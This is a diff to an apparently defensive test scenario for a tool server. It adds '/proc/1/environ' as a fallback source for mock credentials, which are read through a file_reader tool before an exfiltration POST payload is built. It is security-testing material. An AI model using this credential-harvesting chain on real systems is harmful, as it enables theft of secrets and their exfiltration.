@@ -31,7 +31,15 @@ CREDENTIAL_PATTERNS = [
     ("INTERNAL_API_TOKEN",    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MOCK", "Medium"),
 ]
 
-CREDENTIALS_PATH = "/mnt/data/config/credentials.env"
+# Primary path: EFS-mounted credentials file (seeded by mock_data/seed_secrets.sh).
+# Fallback path: process environment, which exposes the same plaintext mock
+# credentials injected as ECS task env vars (baseline misconfiguration).
+# Both paths demonstrate the same vulnerability; the fallback ensures the
+# scenario produces valid results even when EFS has not been seeded yet.
+CREDENTIALS_PATHS = [
+    "/mnt/data/config/credentials.env",   # EFS-backed (preferred)
+    "/proc/1/environ",                    # process env fallback
+]
 
 
 def _parse_args() -> argparse.Namespace:
@@ -131,21 +139,26 @@ def main() -> None:
         m2_items: list[dict] = []
         detail_parts = []
 
-        # ── Step 1: Read credentials via file_reader ──────────────────
-        print(f"  Step 1 → file_reader(path={CREDENTIALS_PATH!r})")
-        cred_text, cred_err = asyncio.run(_call_tool(sse_url, "file_reader", {"path": CREDENTIALS_PATH}))
+        # ── Step 1: Read credentials via file_reader (try each path) ─────
+        cred_text, cred_err, used_path = None, None, None
+        for cpath in CREDENTIALS_PATHS:
+            print(f"  Step 1 → file_reader(path={cpath!r})")
+            cred_text, cred_err = asyncio.run(_call_tool(sse_url, "file_reader", {"path": cpath}))
+            if cred_err:
+                print(f"    ✗ {cred_err}")
+            else:
+                used_path = cpath
+                break
 
-        if cred_err:
+        if cred_err or cred_text is None:
             detail_parts.append(
-                f"Step 1 FAILED: file_reader rejected — {cred_err}. "
-                "Dependency on Scenario A; credential retrieval is the prerequisite "
-                "for exfiltration. Run classified as FAILED."
+                f"Step 1 FAILED: file_reader rejected all paths — {cred_err}. "
+                "Credential retrieval is the prerequisite for exfiltration."
             )
-            print(f"    ✗ {cred_err}")
             outcome = "FAILED"
         else:
-            print(f"    ✓ {len(cred_text or '')} bytes retrieved")
-            detail_parts.append("Step 1 SUCCESS: credentials.env read")
+            print(f"    ✓ {len(cred_text or '')} bytes retrieved from {used_path}")
+            detail_parts.append(f"Step 1 SUCCESS: credentials read from {used_path}")
 
             # ── Step 2: Build POST payload ─────────────────────────────
             payload = _build_payload(cred_text or "")
